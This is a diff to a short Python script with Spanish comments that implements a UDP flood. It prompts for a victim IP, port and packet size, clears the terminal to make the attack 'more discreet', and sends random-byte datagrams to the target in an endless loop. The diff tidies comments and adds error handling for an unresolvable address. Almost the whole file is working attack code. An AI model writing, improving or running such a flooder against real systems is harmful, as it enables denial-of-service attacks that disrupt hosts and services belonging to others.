@@ -1,47 +1,43 @@
 import random
 import socket
 import os
-#Aqui he importado las herramientas necesarias, random es para aleatorizar los bytes a enviar
-#socket es para poder crear un socket para conexion UDP
-#y os es para poder averiguar el sistema operativo de nuestro usuario y limpiar su terminal
 
-# Limpiar la terminal para que el ataque sea mas discreto
+# Importo las herramientas necesarias: random para aleatorizar los bytes a enviar,
+# socket para crear el socket de conexión UDP,
+# y os para averiguar el sistema operativo y limpiar la terminal.
+
+# Limpio la terminal para que el ataque sea más discreto.
 os.system("cls" if os.name == "nt" else "clear")
 
-# Crear un socket UDP para poder establecer una conexion
+# Creo un socket UDP para poder establecer una conexión.
 connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-#Solicitar al usuario la ip victima
+# Solicito al usuario la IP víctima y elimino posibles espacios accidentales.
 print("Ingresa la IP de la víctima por favor")
-ip = input("IP>")
+ip = input("IP>").strip()
 
-# Solicitar al usuario la cantidad de bytes para el ataque
+# Solicito al usuario la cantidad de bytes para el ataque.
 size_attack = int(input("Por favor ingresa un número de bytes que deseas enviar a la víctima: "))
 
-#Solicitar al usuario el puerto victima
+# Solicito al usuario el puerto víctima.
 print("Introduce el puerto de la víctima por favor")
 port = int(input("PUERTO>"))
 
-#Añado algunas lineas inecesarias
+# Añado algunas líneas innecesarias.
 print("Preparando el ataque...")
 print("Preparando el ataque...")
 print("Preparando el ataque...")
 print("Preparando el ataque...")
 print("Preparando el ataque...")
 
-
-#La parte interesante del programa donde se va a lanzar el ataque
+# Lanzo el ataque en la parte principal del programa controlando posibles errores de red.
 while True:
     try:
         connect.sendto(bytes(random.randint(0, 255) for _ in range(size_attack)), (ip, port))
         print("Ataque enviado correctamente")
-        print(alex)
-        print(alex)
-        print(alex)
+    except socket.gaierror:
+        print("Error: La dirección IP introducida no es válida o no se puede resolver.")
+        break
     except KeyboardInterrupt:
         print("Cancelado por el usuario")
         break
-#Estamos creando un bucle para atacar al puerto de la victima usando la variable connect y el metodo send to
-#aleatorizando los bytes en el rango del ataque que especificamos
-#Si el usuario ejecuta CTRL + C el ataque se detendrá
-
